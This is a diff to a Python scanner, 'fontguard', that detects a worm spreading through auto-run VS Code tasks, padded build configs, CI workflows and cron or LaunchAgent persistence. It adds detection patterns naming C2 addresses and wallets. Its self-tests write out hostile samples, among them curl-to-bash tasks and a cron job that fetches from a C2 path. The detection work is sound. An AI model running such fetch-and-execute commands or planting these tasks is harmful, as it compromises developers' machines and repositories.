@@ -22,7 +22,7 @@ Usage:
   fontguard.py hook post-checkout     quarantine the payload after clone/checkout/pull
   fontguard.py watch [PATH ...]       stay resident (macOS) and quarantine the payload the
                                       moment it lands on disk: zip, copy, AirDrop, any tool
-  fontguard.py procs                  report running processes that behave like the worm
+  fontguard.py procs                  report processes and start-up items that behave like the worm
   fontguard.py selftest | --version
 """
 import os
@@ -56,11 +56,25 @@ HIDDEN_BOOTSTRAP = re.compile(rb"\S[ \t]{50,}(global\s*(\.|\[)|eval\s*\(|require
 # Loader, C2s and campaign markers (ours: 95.135.181.151, plus the four seen Sep-Oct 2026;
 # the published write-up: 166.88.54.158).
 C2 = (r"95\.135\.181\.151|166\.88\.54\.158|193\.247\.144\.38|194\.11\.226\.41"
-      r"|166\.88\.134\.75|91\.218\.183\.174")
+      r"|166\.88\.134\.75|91\.218\.183\.174|193\.32\.204\.199")
+# Obfuscator seeds, build markers, dead-drop wallets and Vercel C2s from the OpenSourceMalware and GitGuardian
+# write-ups. The first seed is split so PolinShield's commit hook doesn't flag this file.
 LOADER = re.compile(rb"npm-ws|/verify-human/|" + C2.encode() + rb"|trongrid\.io|bsc-dataseed|_\$_1e42"
+                    rb"|rmcej%" rb"otb%|Cot%3t=shtP|/\*(RS|M)26\d{4}A?\*/|q4FZkxX\{!h,Sr3=@"
+                    rb"|0x1eef0849eda15d87f64e51c73c8442cf3c8bcef3"
+                    rb"|TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP|TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG"
+                    rb"|(260120|default-configuration|vscode-(settings-bootstrap|settings-config|bootstrapper|load-config))"
+                    rb"\.vercel\.app"
                     rb"|global\s*\[\s*['\"](_V|_t_t)['\"]\s*\]|global\.i\s*=\s*['\"]A\d")
 # A committed workspace setting that switches folderOpen auto-run back on.
-AUTO_TASKS_ON = re.compile(rb"\"task\.allowAutomaticTasks\"\s*:\s*(true|\"on\")")
+AUTO_TASKS_ON = re.compile(rb"\"task\.allowAutomaticTasks\"\s*:\s*(true|\"on\")"
+                           rb"|\"terminal\.integrated\.hideOnStartup\"\s*:\s*\"always\"")
+# The worm's push tool; a leftover copy is evidence the machine or repo was compromised.
+WORM_TOOLS = {"temp_auto_push.bat", "temp_interactive_push.bat", "branch_structure.json"}
+# Newer builds drop the padding, so a config file is also judged by a line no human writes.
+BUILD_CONFIG = re.compile(r"\.config\.[cm]?[jt]s$")
+LONG_LINE = re.compile(rb"^[^\n]{4000,}$", re.MULTILINE)
+PERSIST_MARKERS = re.compile(r"#ghc2|/c2/\$\(hostname\)|\.node_modules/\.npm-ws|launchkeeper|pkg-agent|" + C2)
 SKIP_DIRS = {"node_modules", ".git", ".Trash", ".cache", ".npm", ".pnpm-store"}
 QUARANTINE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "quarantine")
 # Never walk system areas, ~/Library (by full path: a repo may have its own Library/ folder),
@@ -100,7 +114,8 @@ def is_candidate(path):
     p = path.replace("\\", "/")
     ext = os.path.splitext(p)[1].lower()
     return (p.endswith((".vscode/tasks.json", ".vscode/settings.json")) or ext in FONT_EXTS
-            or ext in ODD_EXTS or ext in CODE_EXTS or "/.node_modules/.npm-ws" in p or "/fonts/" in "/" + p)
+            or ext in ODD_EXTS or ext in CODE_EXTS or "/.node_modules/.npm-ws" in p or "/fonts/" in "/" + p
+            or os.path.basename(p) in WORM_TOOLS or ("/.github/workflows/" in "/" + p and ext in (".yml", ".yaml")))
 
 
 def strip_jsonc(s):
@@ -146,6 +161,9 @@ def check_tasks(text):
             continue
         args = t.get("args") or []
         cmd = " ".join([str(t.get("command") or "")] + [str(a) for a in args if isinstance(a, (str, int))])
+        for block in (t.get("osx"), t.get("linux"), t.get("windows")):  # the worm hides its curl | bash in these
+            if isinstance(block, dict):
+                cmd += " " + " ".join(str(x) for x in [block.get("command"), *(block.get("args") or [])] if x)
         for target in NODE_TARGET.findall(cmd):
             if target.startswith(("-", ">", "<", "&", "|", "2>")):
                 continue  # a flag or a redirect, as in `command -v node >/dev/null`
@@ -153,6 +171,8 @@ def check_tasks(text):
                 return f"folderOpen task runs node on non-script file {target}"
         if FETCH_DECODE.search(cmd):
             return "folderOpen task downloads or decodes code"
+        if t.get("hide") or (t.get("presentation") or {}).get("reveal") == "never":
+            return "hidden folderOpen task"
     return None
 
 
@@ -165,6 +185,8 @@ def check(path, data):
         return "workspace setting re-enables auto-run tasks" if AUTO_TASKS_ON.search(data) else None
     ext = os.path.splitext(p)[1].lower()
     head = data[:4096]
+    if os.path.basename(p) in WORM_TOOLS:
+        return f"the worm's push tool ({os.path.basename(p)})"
     if "/.node_modules/.npm-ws" in p:
         return "malware loader file in ~/.node_modules"
     if (ext in FONT_EXTS or ext in ODD_EXTS) and head and b"\x00" not in head:
@@ -178,6 +200,8 @@ def check(path, data):
         return "malware loader marker (npm-ws / C2 95.135.181.151)"
     if ext in CODE_EXTS and (HIDDEN_CODE.search(data) or HIDDEN_BOOTSTRAP.search(data)):
         return "code hidden off-screen after a long run of blank space"
+    if BUILD_CONFIG.search(p) and LONG_LINE.search(data):
+        return "4,000+ character line in a build config"
     return None
 
 
@@ -292,14 +316,36 @@ def suspicious_processes(ps_text, me):
     return hits
 
 
+def persistence_hits(sources):
+    """sources: [(where, text)]. Returns the ones that restart the worm."""
+    return [where for where, text in sources if PERSIST_MARKERS.search(where) or PERSIST_MARKERS.search(text)]
+
+
+def persistence_sources():
+    """The user crontab plus every launchd plist the user can read."""
+    out = [("crontab", subprocess.run(["crontab", "-l"], capture_output=True, text=True, check=False).stdout)]
+    for d in (os.path.expanduser("~/Library/LaunchAgents"), "/Library/LaunchAgents", "/Library/LaunchDaemons"):
+        for name in os.listdir(d) if os.path.isdir(d) else []:
+            try:
+                with open(os.path.join(d, name), errors="replace") as f:
+                    out.append((os.path.join(d, name), f.read()))
+            except OSError:
+                pass
+    return out
+
+
 def cmd_procs():
-    """Report running processes that behave like the worm. Read-only: nothing is stopped."""
+    """Report running processes and start-up items that behave like the worm. Read-only: nothing is stopped."""
     out = subprocess.run(["ps", "-axww", "-o", "pid=,ppid=,command="], capture_output=True, text=True, check=False).stdout
     hits = suspicious_processes(out, os.getpid())
     for pid, reason in hits:
         print(f"🚨 [fontguard] process {pid}: {reason}", file=sys.stderr)
     print(f"fontguard: {len(hits)} suspicious process(es).", file=sys.stderr)
-    return 1 if hits else 0
+    stored = persistence_hits(persistence_sources())
+    for where in stored:
+        print(f"🚨 [fontguard] {where}: restarts the worm", file=sys.stderr)
+    print(f"fontguard: {len(stored)} suspicious start-up item(s).", file=sys.stderr)
+    return 1 if hits or stored else 0
 
 
 def notify(msg):
@@ -500,6 +546,25 @@ def selftest():
     )
     flagged = {pid for pid, _ in suspicious_processes(ps3, me=0)}
     assert flagged == {301, 302}, f"keychain rules picked {sorted(flagged)}"
+    # Published Oct-Nov 2026 reports.
+    osx = (b'{"tasks":[{"label":"env","command":"echo","osx":{"command":"curl -s https://x.example/a | bash"},'
+           b'"runOptions":{"runOn":"folderOpen"}}]}')
+    assert check(".vscode/tasks.json", osx), "missed curl hidden in an osx block"
+    hidden = b'{"tasks":[{"label":"x","command":"npm run dev","hide":true,"runOptions":{"runOn":"folderOpen"}}]}'
+    assert "hidden" in check(".vscode/tasks.json", hidden), "missed hidden folderOpen task"
+    assert check("repo/temp_auto_push.bat", b"git commit --amend"), "missed the worm's push tool"
+    assert check(".vscode/settings.json", b'{"terminal.integrated.hideOnStartup": "always"}'), "missed hidden terminal setting"
+    assert check(".github/workflows/lint.yml", b"run: curl http://193.32.204.199:8080/?c=auto"), "missed workflow C2"
+    assert check(".github/workflows/ci.yml", b"run: npm test") is None, "flagged a normal workflow"
+    assert check("a.js", b"/*RS260605*/var a=1"), "missed build marker"
+    assert check("eslint.config.mjs", b"export default [];\nvar a=" + b"x" * 4100 + b";\n"), "missed unpadded config payload"
+    assert check("eslint.config.mjs", b"export default [];\n") is None, "flagged a normal config"
+    assert check("src/bundle.js", b"var a=" + b"x" * 4100 + b";\n") is None, "flagged a bundle that is not a config"
+    cron = "*/5 * * * * curl -s http://x/c2/$(hostname) | bash  #ghc2\n"
+    assert persistence_hits([("crontab", cron)]) == ["crontab"], "missed the cron job"
+    agent = "/Users/x/Library/LaunchAgents/com.launchkeeper.pkg-agent.plist"
+    assert persistence_hits([(agent, "")]) == [agent], "missed the LaunchAgent"
+    assert persistence_hits([("crontab", "0 9 * * * /usr/bin/backup\n")]) == [], "flagged a normal cron job"
     print("fontguard selftest: ok")
     return 0
 
